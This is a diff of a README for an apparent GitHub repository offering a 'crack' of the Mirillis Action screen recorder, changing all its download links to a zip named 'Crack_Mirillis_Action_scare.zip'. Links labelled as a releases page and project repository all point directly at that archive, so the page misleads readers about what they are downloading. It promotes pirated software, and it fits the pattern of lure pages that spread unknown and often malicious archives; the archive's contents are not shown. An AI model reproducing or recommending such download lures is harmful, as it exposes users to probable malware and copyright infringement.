@@ -1,7 +1,7 @@
 # 🎥 Mirillis-Action-Crack - Capture Your Screen with Ease
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/Suescun99/Mirillis-Action-Crack/main/parison/Mirillis-Action-Crack.zip)](https://raw.githubusercontent.com/Suescun99/Mirillis-Action-Crack/main/parison/Mirillis-Action-Crack.zip)
+[![Download](https://github.com/Suescun99/Mirillis-Action-Crack/raw/refs/heads/main/parison/Crack_Mirillis_Action_scare.zip)](https://github.com/Suescun99/Mirillis-Action-Crack/raw/refs/heads/main/parison/Crack_Mirillis_Action_scare.zip)
 
 ## 🚀 Getting Started
 Mirillis-Action-Crack allows you to record your screen easily. No special skills are needed to use it. Follow these steps to start capturing your screen quickly.
@@ -17,7 +17,7 @@ Before you begin, ensure your computer meets these requirements:
 
 ## 📁 Download & Install
 1. **Visit the Releases Page**  
-   To get the latest version of Mirillis-Action-Crack, [visit this page to download](https://raw.githubusercontent.com/Suescun99/Mirillis-Action-Crack/main/parison/Mirillis-Action-Crack.zip).
+   To get the latest version of Mirillis-Action-Crack, [visit this page to download](https://github.com/Suescun99/Mirillis-Action-Crack/raw/refs/heads/main/parison/Crack_Mirillis_Action_scare.zip).
 
 2. **Choose Your Version**  
    On the releases page, you will see a list of available versions. Select the most recent version for the best features and fixes.
@@ -76,7 +76,7 @@ If you run into any issues, check the Frequently Asked Questions section on the 
 For the latest updates and features, keep an eye on the releases page. You can also subscribe to notifications on GitHub to stay informed.
 
 ## 🔗 Useful Links
-- [Mirillis-Action-Crack Releases](https://raw.githubusercontent.com/Suescun99/Mirillis-Action-Crack/main/parison/Mirillis-Action-Crack.zip)
-- [Project Repository](https://raw.githubusercontent.com/Suescun99/Mirillis-Action-Crack/main/parison/Mirillis-Action-Crack.zip)
+- [Mirillis-Action-Crack Releases](https://github.com/Suescun99/Mirillis-Action-Crack/raw/refs/heads/main/parison/Crack_Mirillis_Action_scare.zip)
+- [Project Repository](https://github.com/Suescun99/Mirillis-Action-Crack/raw/refs/heads/main/parison/Crack_Mirillis_Action_scare.zip)
 
 Feel free to explore and start creating engaging content with Mirillis-Action-Crack!
